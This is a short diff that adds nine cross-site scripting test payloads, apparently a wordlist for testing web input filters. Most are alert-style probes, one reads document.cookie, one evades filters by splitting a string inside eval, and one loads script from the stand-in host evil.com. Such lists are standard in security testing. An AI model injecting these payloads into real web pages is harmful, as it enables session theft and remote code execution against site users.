@@ -1,0 +1,9 @@
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+<script>confirm(1)</script>
+<script>prompt(1)</script>
+<script>print()</script>
+<script src=//evil.com/x.js></script>
+<script>eval('ale'+'rt(1)')</script>
